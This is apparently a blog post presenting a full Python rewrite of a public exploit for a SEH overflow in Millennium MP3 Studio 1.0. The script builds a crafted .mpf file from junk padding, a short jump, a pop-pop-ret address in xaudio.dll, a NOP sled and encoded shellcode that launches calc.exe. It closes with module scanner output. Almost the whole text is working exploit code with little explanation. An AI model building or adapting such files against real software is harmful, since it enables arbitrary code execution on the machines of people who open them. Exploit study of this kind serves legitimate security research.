Millennium MP3 Studio .mpf File Parsing SEH Overflow
====================================================
date: 02/Sep/2012
summary: Millenium MP3 Studio SEH overflow via a pop-pop-return overwrite.
tags: code, exploit

## Introduction

The Millennium MP3 Studio version 1.0 is prone to a SEH overflow vulnerability. Processing specially-crafted `.mpf` files could trigger a SEH overwrite that could be leveraged further to gain arbitrary code execution. The exploit for this vulnerability has been documented at [EDB: 9298](http://www.exploit-db.com/exploits/9298/)

## Exploit Code

Here is a complete rewrite of this exploit:

```python
from struct import *

file = "edb9298.mpf"

# msfpayload windows/exec CMD=calc.exe EXITFUNC=seh R | msfencode -b '\x00\x0a\x0d' -t perl
# [*] x86/shikata_ga_nai succeeded with size 227 (iteration=1)

calc = ("\xbb\x34\x46\x73\x3a\xda\xd2\xd9\x74\x24\xf4\x5a\x31\xc9" +
"\xb1\x33\x31\x5a\x12\x83\xea\xfc\x03\x6e\x48\x91\xcf\x72" +
"\xbc\xdc\x30\x8a\x3d\xbf\xb9\x6f\x0c\xed\xde\xe4\x3d\x21" +
"\x94\xa8\xcd\xca\xf8\x58\x45\xbe\xd4\x6f\xee\x75\x03\x5e" +
"\xef\xbb\x8b\x0c\x33\xdd\x77\x4e\x60\x3d\x49\x81\x75\x3c" +
"\x8e\xff\x76\x6c\x47\x74\x24\x81\xec\xc8\xf5\xa0\x22\x47" +
"\x45\xdb\x47\x97\x32\x51\x49\xc7\xeb\xee\x01\xff\x80\xa9" +
"\xb1\xfe\x45\xaa\x8e\x49\xe1\x19\x64\x48\x23\x50\x85\x7b" +
"\x0b\x3f\xb8\xb4\x86\x41\xfc\x72\x79\x34\xf6\x81\x04\x4f" +
"\xcd\xf8\xd2\xda\xd0\x5a\x90\x7d\x31\x5b\x75\x1b\xb2\x57" +
"\x32\x6f\x9c\x7b\xc5\xbc\x96\x87\x4e\x43\x79\x0e\x14\x60" +
"\x5d\x4b\xce\x09\xc4\x31\xa1\x36\x16\x9d\x1e\x93\x5c\x0f" +
"\x4a\xa5\x3e\x45\x8d\x27\x45\x20\x8d\x37\x46\x02\xe6\x06" +
"\xcd\xcd\x71\x97\x04\xaa\x80\x66\x95\x26\x14\xd1\x4c\x0b" +
"\x78\xe2\xba\x4f\x85\x61\x4f\x2f\x72\x79\x3a\x2a\x3e\x3d" +
"\xd6\x46\x2f\xa8\xd8\xf5\x50\xf9\xba\x98\xc2\x61\x13\x3f" +
"\x63\x03\x6b")

# 50B jump to avoid CSEH and a 4B hole @ 0012F930
# jumps directly from nseh to nop sled > shellcode
junk = "A"*4112
nseh = pack ('<I', 0x909032EB)# short jump 50B
cseh = pack ('<I', 0x1001FFC7)# p/p/r 1001FFC7 xaudio.dll
nops = "\x90"*80

'''
# 8B jump to avoid CSEH and land in the first NOP sled of 12B
# another 8B jump from there to avoid a 4B hole @ 0012F930 and land in the final NOP sled > shellcode
junk = "A"*4112
nseh = pack ('<I', 0x909008EB)# short jump 8B
cseh = pack ('<I', 0x1001FFC7)# p/p/r 1001FFC7 xaudio.dll
nops = "\x90"*12
jump = pack ('<I', 0x909008EB)# short jump 8B
nops2 = "\x90"*40
'''

sploit = junk+nseh+cseh+nops+calc

try:
handle = open (file, 'w')
handle.write (sploit)
handle.close ()
print "[+] sploit ready: " + file + " (" + str (len (sploit)) + "B)"
except:
print "[-] exception!"

'''
/SafeSEH Module Scanner, item 30
 SEH mode=/SafeSEH OFF
 Base=0x10000000
 Limit=0x10044000
 Module version=3, 0, 7, 0
 Module Name=xaudio.dll
'''
```
